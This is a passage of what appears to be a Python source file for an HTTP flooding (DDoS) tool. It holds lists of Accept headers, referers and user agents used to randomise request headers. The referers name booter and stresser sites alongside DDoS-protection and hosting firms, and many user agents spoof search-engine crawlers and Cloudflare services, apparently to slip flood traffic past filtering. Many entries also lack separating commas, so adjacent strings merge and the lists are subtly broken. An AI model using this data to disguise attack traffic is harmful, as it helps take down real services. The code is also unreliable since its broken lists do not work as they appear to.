"Accept:text/html,application/xml;q=0.9,application/xhtml+xml,image/png,image/webp,image/jpeg,image/gif,image/x-xbitmap,*/*;q=0.1\r\nAccept-Encoding:gzip\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Charset:utf-8,iso-8859-1;q=0.5\r\n,"
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\n",
"Accept-Charset:utf-8,iso-8859-1;q=0.5\r\nAccept-Language:utf-8,iso-8859-1;q=0.5,*;q=0.1\r\n",
"Accept:text/html,application/xhtml+xml",
"Accept-Language:en-US,en;q=0.5\r\n",
"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding:br;q=1.0,gzip;q=0.8,*;q=0.1\r\n",
"Accept:text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset:iso-8859-1\r\n",]
referers=[
"https://www.google.com/search?q=",
"https://check-host.net/",
"https://www.facebook.com/",
"https://www.youtube.com/",
"https://cyber-hub.pw/"
"https://www.vedbex.com/tools/home"
"https://www.ibm.com/cloud"
"https://voxility.com/"
"https://www.redwolfsecurity.com/"
"https://www.ionos.com/"
"https://duckduckgo.com/"
"http://ffm.cloudlayar.xyz/HIT",
"https://1gb.ru/",
"https://artplanet.ru/",
"https://api.freeboot.to/",
"https://www.react.su/"
"https://synstresser.to/"
"https://freeboot.to/"
"https://dosninja.com/"
"http://ddos-protection.ru/"
"https://www.fbi.com/",
"https://www.bing.com/search?q=",
"https://www.cloudflare.com/",
"https://www.ovh.ie/",
"https://www.hetzner.com/",
"https://ddos-guard.net/",
"https://blazingfast.io/",
"https://www.rambler.ru/",
"https://selectel.ru/"
"https://www.cloudns.net/"
"http://1.1.1.1/"
"http://regex.info/exif.cgi?url="
"https://upcloud.com/"
"https://www.nhc.noaa.gov/"
"https://www.youtube.com/"
"https://www.online.net/"
"https://www.linode.com/"
"https://www.datacamp.com/"
"https://yandex.ru/"
"https://beget.com/"
"https://add.my.yahoo.com/rss?url"
"https://www.hostgator.com/"
"https://www.bluehost.com"
"https://play.google.com/store/search?q="
"https://github.com/"
"https://www.twitter.com/"
"https://google.com/"
"https://www.kaspersky.ru/"
"https://firstvds.ru"
"https://www.croc.ru/"
"https://yandex.kz/"
"https://www.reg.ru/"
"https://m.ok.ru/"
"https://vk.com/"
"https://www.first-colo.net/"
"https://cyberwarblog.xyz"
"https://www.liquidweb.com/"
"https://www.servereasy.it/"
"https://twitch.com"
"https://www.stackpath.com/"
"https://cloudnode.pw/"
"https://r.search.yahoo.com/",
]

useragents=["AdsBot-Google(http://www.google.com/adsbot.html)",
"AvantBrowser/1.2.789rel1(http://www.avantbrowser.com)",
"TelegramBot(likeTwitterBot)"
"Mozilla/5.0(Macintosh;IntelMacOSX10_13_6)AppleWebKit/537.36(KHTML,likeGecko)Chrome/77.0.3865.90Safari/537.36TelegramBot(likeTwitterBot)"
"Mozilla/5.0(compatible;YandexAdNet/1.0;+http://yandex.com/bots)"
"Mozilla/5.0(compatible;Cloudflare-Smart-Transit/1.0;+https://www.cloudflare.com/"
"Mozilla/5.0(Linux;Android5.0;SM-G920A)AppleWebKit(KHTML,likeGecko)ChromeMobileSafari(compatible;AdsBot-Google-Mobile;+http://www.google.com/mobile/adsbot.html)"
"Googlebot/2.1(+http://www.google.com/bot.html)""Mozilla/5.0(Linux;Android6.0.1;Nexus5XBuild/MMB29P)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2272.96MobileSafari/537.36(compatible;Pinterestbot/1.0;+http://www.pinterest.com/bot.html)"
"Mozilla/5.0(iPhone;CPUiPhoneOS8_1likeMacOSX)AppleWebKit/600.1.4(KHTML,likeGecko)Version/8.0Mobile/12B411Safari/600.1.4(compatible;YandexBot/3.0;+http://yandex.com/bots)"
"Mozilla/5.0(Slurp/cat;slurp@inktomi.com;http://www.inktomi.com/slurp.html)"
"Mozilla/5.0(Macintosh;IntelMacOSX10_8_3)AppleWebKit/536.28.10(KHTML,likeGecko)Version/6.0.3Safari/536.28.10",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:20.0)Gecko/20100101Firefox/20.0",
"Mozilla/5.0(Linux;Android6.0.1;Nexus5XBuild/MMB29P)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2272.96MobileSafari/537.36(compatible;Googlebot/2.1;+http://www.google.com/bot.html)",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2228.0Safari/537.36(compatible;YandexScreenshotBot/3.0;+http://yandex.com/bots)"
"Mozilla/5.0(compatible;Cloudflare-Smart-Transit/1.0;+https://www.cloudflare.com/",
"Mozilla/5.0(compatible;CloudFlare-AlwaysOnline/1.0;+http://www.cloudflare.com/always-online)AppleWebKit/534.34",
"Mozilla/5.0(compatible;MSIE9.0;AOL9.7;AOLBuild4343.19;WindowsNT6.1;WOW64;Trident/5.0;FunWebProducts)",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/534.57.5(KHTML,likeGecko)Version/5.1.7Safari/534.57.4",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;SV1;.NETCLR2.0.50727)",
"Mozilla/5.0(compatible;AhrefsBot/6.1;+http://ahrefs.com/robot/)",
"Mozilla/5.0(Linux;U;Android5.1;zh-cn;Build/LMY47D)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0Chrome/50.0.0.0MobileSafari/534.30GIONEE-GN9010/GN9010RV/5.0.16",
"Mozilla/5.0(compatible;Google-Site-Verification/1.0)",
"Dalvik/1.6.0(Linux;U;Android4.4.2;GT-I9190Build/KOT49H)",
"Mozilla/5.0(Linux;Android4.4.2;DEXPIxionES24.5Build/KOT49H)AppleWebKit/537.36(KHTML,likeGecko)Chrome/34.0.1847.131YaBrowser/14.5.1847.18432.00MobileSafari/537.36",
"Mozilla/5.0(Linux;U;Android6.0;zh-cn;Build/MRA58K)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0Chrome/50.0.0.0MobileSafari/534.30GIONEE-S9/S9RV/5.0.17",
"VK/28CFNetwork/711.4.6Darwin/14.0.0",
"Instagram8.2.0(iPhone4,1;iPhoneOS8_4;ru_RU;ru;scale=2.00;640x960)AppleWebKit/420+",
"Mozilla/5.0(Macintosh;IntelMacOSX10_11_5)AppleWebKit/537.36(KHTML,likeGecko)Chrome/51.0.2704.106Safari/537.36",
"Mozilla/5.0(compatible;MJ12bot/v1.4.5;http://www.majestic12.co.uk/bot.php?+)"
"Mozilla/5.0(compatible;vkShare;+vk.com/dev/Share)",
"Mozilla/5.0(WindowsMobile10;Android8.0.0;Microsoft;Lumia950XL)AppleWebKit/537.36(KHTML,likeGecko)Chrome/80.0.3987.149MobileSafari/537.36Edge/80.0.361.62"
"Mozilla/5.0(Linux;Android5.1.1)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Focus/2.3Chrome/59.0.3071.125MobileSafari/537.36"
"Mozilla/5.0(Linux;Android6.0;Nexus5Build/MRA58N)"
"Mozilla/5.0(X11;Linuxaarch64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/52.0.2743.84Safari/537.36CrKey/1.21a.76178",
"Sogouheadspider/3.0(http://www.sogou.com/docs/help/webmasters.htm#07)",
"Mozilla/5.0(WindowsNT10.0;WOW64;rv:46.0)Gecko/20100101Firefox/46.0"
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/78.0.3904.99Safari/537.36Vivaldi/2.9.1705.41",
"Mozilla/5.0(Linux;Android9;STF-L09Build/HUAWEISTF-L09;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/79.0.3945.79MobileSafari/537.36[Pinterest/Android]",
"Mozilla/5.0(iPhone;CPUiPhoneOS13_3_1likeMacOSX)AppleWebKit/605.1.15(KHTML,likeGecko)Mobile/15E148[FBAN/FBIOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Verizon]",
"Mozilla/5.0(iPhone;CPUiPhoneOS13_3likeMacOSX)AppleWebKit/605.1.15(KHTML,likeGecko)Mobile/15E148[FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/AT&T]",
"Mozilla/5.0(Macintosh;IntelMacOSX10_15_0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/75.0.3770.100Safari/537.36",
"Mozilla/5.0(Macintosh;IntelMacOSX10_15_0)AppleWebKit/537.36(KHTML,likeGecko)Chrome/75.0.3770.100Safari/537.36",
"WeatherReport/1.2.1CFNetwork/485.12.7Darwin/10.4.0",
"WeatherReport/1.2.2CFNetwork/485.12.7Darwin/10.4.0",
"Mozilla/5.0(iPhone;CPUiPhoneOS12_3_1likeMacOSX)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.1.1Mobile/15E148Safari/604.1",
"Mozilla/5.0(Linux;Android4.2.2;PhilipsS388Build/JDQ39)AppleWebKit/537.36(KHTML,likeGecko)Chrome/47.0.2526.73MobileSafari/537.36OPR/34.0.2044.98679"
"Mozilla/5.0(compatible;Discordbot/2.0;+https://discordapp.com)"
"Googlebot/2.1(http://www.googlebot.com/bot.html)"
"Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/51.0.2704.103Safari/537.36",
"Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/52.0.2743.116Safari/537.36",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/51.0.2704.103Safari/537.36",
"APIs-Google(+https://developers.google.com/webmasters/APIs-Google.html)"
"Mozilla/5.0(Linux;Android4.4;Nexus5Build/_BuildID_)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/30.0.0.0MobileSafari/537.36"
"Opera/9.80(X11;Linuxi686;Ubuntu/14.10)Presto/2.12.388Version/12.16"
"Mozilla/5.0(Linux;U;Android2.3.1;en-us;MIDBuild/GINGERBREAD)AppleWebKit/533.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Linux;U;Android4.2.2;en-us;MIDBuild/JDQ39)AppleWebKit/534.30(KHTML,likeGecko)Version/4.0Safari/534.30[FB_IAB/FB4A;FBAV/56.0.0.23.68;]",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/80.0.3987.137Safari/537.36OPR/67.0.3575.79"
"Mozilla/5.0(compatible;Bingbot/2.0;+http://www.bing.com/bingbot.htm)"
"Mozilla/5.0(compatible;Yahoo!Slurp;http://help.yahoo.com/help/us/ysearch/slurp)"
"DuckDuckBot/1.0;(+http://duckduckgo.com/duckduckbot.html)"
"Mozilla/5.0(compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)"
"Mozilla/5.0(compatible;Exabot/3.0;+http://www.exabot.com/go/robot)"
"Mozilla/5.0(compatible;Konqueror/3.5;Linux)KHTML/3.5.5(likeGecko)(Exabot-Thumbnails"
"facebookexternalhit/1.1(+http://www.facebook.com/externalhit_uatext.php)"
"ia_archiver(+http://www.alexa.com/site/help/webmasters;crawler@alexa.com)"
"Mozilla/5.0(Linux;Android6.0.1;Nexus5XBuild/MMB29P)AppleWebKit/537.36(KHTML,likeGecko)Chrome/W.X.Y.Zâ€¡MobileSafari/537.36(compatible;Googlebot/2.1;+http://www.google.com/bot.html)"
"Mozilla/5.0(Linux;Android8.1.0;motorolaoneBuild/OPKS28.63-18-3;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/70.0.3538.80MobileSafari/537.36Instagram72.0.0.21.98Android(27/8.1.0;320dpi;720x1362;motorola;motorolaone;deen_sprout;qcom;pt_BR;132081645)"
"Googlebot/2.1(+http://www.google.com/bot.html)"
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2228.0Safari/537.36"
"Baiduspider(http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0(compatible;Linuxx86_64;Mail.RU_Bot/Robots/2.0;+http://go.mail.ru/help/robots)"
"Mozilla/5.0(X11;U;Linuxi686;en-US;rv:1.7.12)Gecko/20051010Firefox/1.0.7(Ubuntupackage1.0.7)"
"BlackBerry7100i/4.1.0Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/103",
"BlackBerry7520/4.0.0Profile/MIDP-2.0Configuration/CLDC-1.1UP.Browser/5.0.3.3UP.Link/5.1.2.12(GoogleWAPProxy/1.0)",
"BlackBerry8300/4.2.2Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/107UP.Link/6.2.3.15.0",
"Mozilla/5.0(Android;Linuxarmv7l;rv:10.0.1)Gecko/20100101Firefox/10.0.1Fennec/10.0.1",
"Mozilla/5.0(Android;Linuxarmv7l;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(WindowsCE6.0;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT5.1;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(WindowsNT5.2;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(WindowsNT6.0)AppleWebKit/535.2(KHTML,likeGecko)Chrome/15.0.874.120Safari/535.2",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/535.2(KHTML,likeGecko)Chrome/18.6.872.0Safari/535.2UNTRUSTED/1.03gpp-gbaUNTRUSTED/1.0",
"Mozilla/5.0(WindowsNT6.1;rv:12.0)Gecko/20120403211507Firefox/12.0",
"Mozilla/5.0(WindowsNT6.1;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT6.1;Win64;x64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/534.27(KHTML,likeGecko)Chrome/12.0.712.0Safari/534.27",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.24Safari/535.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/535.7(KHTML,likeGecko)Chrome/16.0.912.36Safari/535.7",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.6(KHTML,likeGecko)Chrome/20.0.1092.0Safari/536.6",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:15.0)Gecko/20120427Firefox/15.0a1",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:2.0b4pre)Gecko/20100815Minefield/4.0b4pre",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:6.0a2)Gecko/20110622Firefox/6.0a2",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:7.0.1)Gecko/20100101Firefox/7.0.1",
"Mozilla/5.0(WindowsNT6.2)AppleWebKit/536.3(KHTML,likeGecko)Chrome/19.0.1061.1Safari/536.3",
"Mozilla/5.0(Windows;U;;en-NZ)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.8.0",
"Mozilla/5.0(Windows;U;Win98;en-US;rv:1.4)GeckoNetscape/7.1(ax)",
"Mozilla/5.0(Windows;U;WindowsCE5.1;rv:1.8.1a3)Gecko/20060610Minimo/0.016",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/531.21.8(KHTML,likeGecko)Version/4.0.4Safari/531.21.10",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US)AppleWebKit/534.7(KHTML,likeGecko)Chrome/7.0.514.0Safari/534.7",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.8.1.23)Gecko/20090825SeaMonkey/1.1.18",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.9.0.10)Gecko/2009042316Firefox/3.0.10",
"Mozilla/5.0(Windows;U;WindowsNT5.1;tr;rv:1.9.2.8)Gecko/20100722Firefox/3.6.8(.NETCLR3.5.30729;.NET4.0E)",
"Mozilla/5.0(Windows;U;WindowsNT5.2;en-US)AppleWebKit/532.9(KHTML,likeGecko)Chrome/5.0.310.0Safari/532.9",
"Mozilla/5.0(Windows;U;WindowsNT5.2;en-US)AppleWebKit/533.17.8(KHTML,likeGecko)Version/5.0.1Safari/533.17.8",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-GB;rv:1.9.0.11)Gecko/2009060215Firefox/3.0.11(.NETCLR3.5.30729)",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.6(Change:)",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/533.1(KHTML,likeGecko)Maxthon/3.0.8.2Safari/533.1",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US)AppleWebKit/534.14(KHTML,likeGecko)Chrome/9.0.601.0Safari/534.14",
"Mozilla/5.0(Windows;U;WindowsNT6.0;en-US;rv:1.9.1.6)Gecko/20091201Firefox/3.5.6GTB5",
"Mozilla/5.0(Windows;U;WindowsNT6.0x64;en-US;rv:1.9pre)Gecko/2008072421Minefield/3.0.2pre",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-GB;rv:1.9.1.17)Gecko/20110123(likeFirefox/3.x)SeaMonkey/2.0.12",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/532.5(KHTML,likeGecko)Chrome/4.0.249.0Safari/532.5",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/533.19.4(KHTML,likeGecko)Version/5.0.2Safari/533.18.5",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.14(KHTML,likeGecko)Chrome/10.0.601.0Safari/534.14",
"Mozilla/5.0(Windows;U;WindowsNT6.1;en-US)AppleWebKit/534.20(KHTML,likeGecko)Chrome/11.0.672.2Safari/534.20",
"Mozilla/5.0(Windows;U;WindowsXP)GeckoMultiZilla/1.6.1.0a",
"Mozilla/5.0(Windows;U;WinNT4.0;en-US;rv:1.2b)Gecko/20021001Phoenix/0.2",
"Mozilla/5.0(X11;FreeBSDamd64;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/534.34(KHTML,likeGecko)QupZilla/1.2.0Safari/534.34",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/535.1(KHTML,likeGecko)Ubuntu/11.04Chromium/14.0.825.0Chrome/14.0.825.0Safari/535.1",
"Mozilla/5.0(X11;Linuxi686)AppleWebKit/535.2(KHTML,likeGecko)Ubuntu/11.10Chromium/15.0.874.120Chrome/15.0.874.120Safari/535.2",
"Mozilla/5.0(X11;Linuxi686onx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxi686onx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1Fennec/2.0.1",
"Mozilla/5.0(X11;Linuxi686;rv:10.0.1)Gecko/20100101Firefox/10.0.1SeaMonkey/2.7.1",
"Mozilla/5.0(X11;Linuxi686;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/5.0(X11;Linuxi686;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxi686;rv:2.0b6pre)Gecko/20100907Firefox/4.0b6pre",
"Mozilla/5.0(X11;Linuxi686;rv:5.0)Gecko/20100101Firefox/5.0",
"Mozilla/5.0(X11;Linuxi686;rv:6.0a2)Gecko/20110615Firefox/6.0a2Iceweasel/6.0a2",
"Mozilla/5.0(X11;Linuxi686;rv:6.0)Gecko/20100101Firefox/6.0",
"Mozilla/5.0(X11;Linuxi686;rv:8.0)Gecko/20100101Firefox/8.0",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/534.24(KHTML,likeGecko)Ubuntu/10.10Chromium/12.0.703.0Chrome/12.0.703.0Safari/534.24",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/535.1(KHTML,likeGecko)Chrome/13.0.782.20Safari/535.1",
"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.9Safari/536.5",
"Mozilla/5.0(X11;Linuxx86_64;en-US;rv:2.0b2pre)Gecko/20100712Minefield/4.0b2pre",
"Mozilla/5.0(X11;Linuxx86_64;rv:10.0.1)Gecko/20100101Firefox/10.0.1",
"Mozilla/5.0(X11;Linuxx86_64;rv:11.0a2)Gecko/20111230Firefox/11.0a2Iceweasel/11.0a2",
"Mozilla/5.0(X11;Linuxx86_64;rv:2.0.1)Gecko/20100101Firefox/4.0.1",
"Mozilla/5.0(X11;Linuxx86_64;rv:2.2a1pre)Gecko/20100101Firefox/4.2a1pre",
"Mozilla/5.0(X11;Linuxx86_64;rv:5.0)Gecko/20100101Firefox/5.0Iceweasel/5.0",
"Mozilla/5.0(X11;Linuxx86_64;rv:7.0a1)Gecko/20110623Firefox/7.0a1",
"Mozilla/5.0(X11;U;FreeBSDamd64;en-us)AppleWebKit/531.2(KHTML,likeGecko)Safari/531.2Epiphany/2.30.0",
"Mozilla/5.0(X11;U;FreeBSDi386;de-CH;rv:1.9.2.8)Gecko/20100729Firefox/3.6.8",
"Mozilla/5.0(X11;U;FreeBSDi386;en-US)AppleWebKit/532.0(KHTML,likeGecko)Chrome/4.0.207.0Safari/532.0",
"Mozilla/5.0(X11;U;FreeBSDi386;en-US;rv:1.6)Gecko/20040406Galeon/1.3.15",
"Mozilla/5.0(X11;U;FreeBSD;i386;en-US;rv:1.7)Gecko",
"Mozilla/5.0(X11;U;FreeBSDx86_64;en-US)AppleWebKit/534.16(KHTML,likeGecko)Chrome/10.0.648.204Safari/534.16",
"Mozilla/5.0(X11;U;Linuxarm7tdmi;rv:1.8.1.11)Gecko/20071130Minimo/0.025",
"Mozilla/5.0(X11;U;Linuxarmv61;en-US;rv:1.9.1b2pre)Gecko/20081015Fennec/1.0a1",
"Mozilla/5.0(X11;U;Linuxarmv6l;rv1.8.1.5pre)Gecko/20070619Minimo/0.020",
"Mozilla/5.0(X11;U;Linux;en-US)AppleWebKit/527(KHTML,likeGecko,Safari/419.3)Arora/0.10.1",
"Mozilla/5.0(X11;U;Linuxi586;en-US;rv:1.7.3)Gecko/20040924Epiphany/1.4.4(Ubuntu)",
"Mozilla/5.0(X11;U;Linuxi686;en-us)AppleWebKit/528.5(KHTML,likeGecko,Safari/528.5)lt-GtkLauncher",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/532.4(KHTML,likeGecko)Chrome/4.0.237.0Safari/532.4Debian",
"Mozilla/5.0(X11;U;Linuxi686;en-US)AppleWebKit/532.8(KHTML,likeGecko)Chrome/4.0.277.0Safari/532.8",
"BlackBerry8320/4.2.2Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/100",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;snprtz|S26320700000083|2600#ServicePack1#2#5#154321|isdn)"
"BlackBerry8330/4.3.0Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/105",
"BlackBerry9000/4.6.0.167Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/102",
"BlackBerry9530/4.7.0.167Profile/MIDP-2.0Configuration/CLDC-1.1VendorID/102UP.Link/6.3.1.20.0",
"BlackBerry9700/5.0.0.351Profile/MIDP-2.1Configuration/CLDC-1.1VendorID/123",
"Bloglines/3.1(http://www.bloglines.com)",
"Mozilla/5.0(compatible;MSIE8.0;WindowsNT6.1;Trident/4.0;GTB7.4;InfoPath.2;SV1;.NETCLR3.3.69573;WOW64;en-US)"
"Mozilla/5.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0;WOW64;Trident/4.0;SLCC2;.NETCLR2.0.50727;.NETCLR3.5.30729;.NETCLR3.0.30729;.NETCLR1.0.3705;.NETCLR1.1.4322)"
"Mozilla/5.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0;InfoPath.1;SV1;.NETCLR3.8.36217;WOW64;en-US)"
"Mozilla/5.0(compatible;MSIE8.0;WindowsNT6.0;Trident/4.0;.NETCLR2.7.58687;SLCC2;MediaCenterPC5.0;Zune3.4;TabletPC3.6;InfoPath.3)"
"CSSCheck/1.2.2",
"Dillo/2.0",
"DoCoMo/2.0SH901iC(c100;TB;W24H12)",
"DownloadDemon/3.5.0.11",
"ELinks/0.12~pre5-4",
"11.50"
"PHP/7.1"
"Python-urllib/2.7"
"Rome"
"TinyTinyRSS/1.15.3(http://tt-rss.org/)"
"TinyTinyRSS/17.12(http://tt-rss.org/"
"ELinks(0.4pre5;Linux2.6.10-ac7i686;80x33)",
"ELinks/0.9.3(textmode;Linux2.6.9-kanotix-8i686;127x41)",
"EmailWolf1.00",
"everyfeed-spider/2.0(http://www.everyfeed.com)",
"facebookscraper/1.0(http://www.facebook.com/sharescraper_help.php)",
"FAST-WebCrawler/3.8(crawlerattrddotoverturedotcom;http://www.alltheweb.com/help/webmaster/crawler)",
"FeedFetcher-Google;(http://www.google.com/feedfetcher.html)",
"Gaisbot/3.0(robot@gais.cs.ccu.edu.tw;http://gais.cs.ccu.edu.tw/robot.php)",
"Googlebot/2.1(http://www.googlebot.com/bot.html)",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Opera/5.0(Ubuntu;U;WindowsNT6.1;es;rv:1.9.2.13)Gecko/20101203Firefox/3.6.13"
"Opera/5.0(SunOS5.8sun4u;U)[en]"
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/534.57.2(KHTML,likeGecko)Version/5.1.7Safari/534.57.2",
"Mozilla/5.0(WindowsNT5.1;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/5.0(WindowsNT6.1;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;WOW64;Trident/5.0)",
"Mozilla/5.0(Macintosh;IntelMacOSX10.7;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10_7_4)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/5.0(WindowsNT6.1)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/5.0(WindowsNT5.1)AppleWebKit/536.5(KHTML,likeGecko)Chrome/19.0.1084.56Safari/536.5",
"Mozilla/5.0(WindowsNT5.1)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/5.0(Linux;U;Android2.2;fr-fr;Desire_A8181Build/FRF91)App3leWebKit/53.1(KHTML,likeGecko)Version/4.0MobileSafari/533.1",
"Mozilla/5.0(Macintosh;IntelMacOSX10.6;rv:13.0)Gecko/20100101Firefox/13.0.1",
"Mozilla/5.0(iPhone;CPUiPhoneOS5_1_1likeMacOSX)AppleWebKit/534.46(KHTML,likeGecko)Version/5.1Mobile/9B206Safari/7534.48.3",
"Mozilla/4.0(compatible;MSIE6.0;MSIE5.5;WindowsNT5.0)Opera7.02Bork-edition[en]",
"Mozilla/5.0(WindowsNT6.1;WOW64;rv:12.0)Gecko/20100101Firefox/12.0",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/534.57.2(KHTML,likeGecko)Version/5.1.7Safari/534.57.2",
"Mozilla/5.0(Windows;U;WindowsNT5.1;en-US;rv:1.9.2)Gecko/20100115Firefox/3.6",
"Mozilla/5.0(iPad;CPUOS5_1_1likeMacOSX)AppleWebKit/534.46(KHTML,likeGecko)Version/5.1Mobile/9B206Safari/7534.48.3",
"Mozilla/4.0(compatible;MSIE6.0;WindowsNT5.1;SV1;FunWebProducts;.NETCLR1.1.4322;PeoplePal6.2)",
"Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.47Safari/536.11",
"Mozilla/4.0(compatible;MSIE7.0;WindowsNT5.1;SV1;.NETCLR2.0.50727)",
"Mozilla/5.0(WindowsNT6.1;WOW64)AppleWebKit/536.11(KHTML,likeGecko)Chrome/20.0.1132.57Safari/536.11",
"Mozilla/5.0(WindowsNT5.1;rv:5.0.1)Gecko/20100101Firefox/5.0.1",
"Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)",
"Mozilla/5.0(WindowsNT6.1;rv:5.0)Gecko/20100101Firefox/5.02",
"Opera/9.80(WindowsNT5.1;U;en)Presto/2.10.229Version/11.60",
